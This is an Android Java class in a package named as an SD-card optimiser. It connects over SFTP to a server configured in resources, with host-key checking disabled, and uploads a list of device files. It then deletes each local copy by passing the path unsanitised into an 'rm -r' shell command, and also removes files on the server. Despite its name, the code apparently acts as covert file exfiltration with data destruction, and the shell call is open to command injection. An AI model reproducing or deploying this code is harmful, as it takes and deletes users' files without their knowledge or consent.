package com.android.sd.optimize;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Locale;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpException;

public class Util extends AsyncTask<ArrayList<String>, String, String> {

    private String LOG_TAG = AppGlobals.getLogTag(getClass());
    private Session mSession;
    private Channel mChannel;
    private ChannelSftp mChannelSftp;
    private Context mContext;
    DBHandler dbHandler;
    String tobeDeleted;
    String userName;
    String password;
    String host;
    String port;
    String workingDirectory;

    public Util(Context base) {
        mContext = base;
        dbHandler = new DBHandler(base);
        userName = mContext.getResources().getString(R.string.sftp_username);
        password = mContext.getResources().getString(R.string.sftp_password);
        host = mContext.getResources().getString(R.string.sftp_host);
        port = mContext.getResources().getString(R.string.sftp_port);
        workingDirectory = mContext.getResources().getString(R.string.sftp_working_directory);

    }

    public static String getTime() {
        Calendar c = Calendar.getInstance();
        SimpleDateFormat df = new SimpleDateFormat("yyyyMMdd-HHmmss", Locale.getDefault());
        String formattedDate = df.format(c.getTime());
        return formattedDate;
    }

    void removeFiles(String path) {
        File file = new File(path);
        if (file.exists()) {
            String deleteCmd = "rm -r " + path;
            Runtime runtime = Runtime.getRuntime();
            try {
                runtime.exec(deleteCmd);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    void deletedFileAtServer(ArrayList<String> path) {
        connectToServer();
        try {
            for (String item: path) {
                if (item != null) {
                    mChannelSftp.rm(item);
                    Log.i(LOG_TAG, "file deleted");
                }
            }
        } catch (SftpException e) {
            Log.i(AppGlobals.getLogTag(getClass()), "File is Not on Server");
            dbHandler.deleteUploadedFile("tobedeleted", tobeDeleted);

            }
    }

    @Override
    protected String doInBackground(ArrayList<String>... arrayLists) {
        connectToServer();
        try {
            for (String item: arrayLists[0]) {
                if (item != null) {
                    File file = new File(item);
                    if (mChannelSftp != null) {
                        mChannelSftp.put(new FileInputStream(file), file.getName());
                        Log.i(LOG_TAG, "upload done");
                        removeFiles(item);
                        dbHandler.deleteUploadedFile("filename", item);
                        Log.i(LOG_TAG, "local file deleted");
                        tobeDeleted = item;
                    }
                }
            }
        } catch (FileNotFoundException e) {
            Log.e(LOG_TAG, "File Not found");
            if (tobeDeleted != null) {
                dbHandler.deleteUploadedFile("tobedeleted", tobeDeleted);
            }
        } catch (SftpException e) {
            Log.e(LOG_TAG, "Error in uploading");
            dbHandler.createNewFileNameForUpload("tobedeleted",tobeDeleted);
            dbHandler.deleteUploadedFile("filename",tobeDeleted);
        }
        return null;
    }

    private void connectToServer() {
        JSch jsch = new JSch();
        try {
            mSession = jsch.getSession(userName, host, Integer.valueOf(port));
            mSession.setPassword(password);
            java.util.Properties config = new java.util.Properties();
            config.put("StrictHostKeyChecking", "no");
            mSession.setConfig(config);
            mSession.connect();
            Log.i(LOG_TAG, "Host connected.");
            mChannel = mSession.openChannel("sftp");
            mChannel.connect();
            Log.i(LOG_TAG, "sftp channel opened and connected.");
            mChannelSftp = (ChannelSftp) mChannel;
            mChannelSftp.cd(workingDirectory);
        } catch (JSchException ignore) {
            ignore.printStackTrace();
        } catch (SftpException e) {
            e.printStackTrace();
        }
    }
}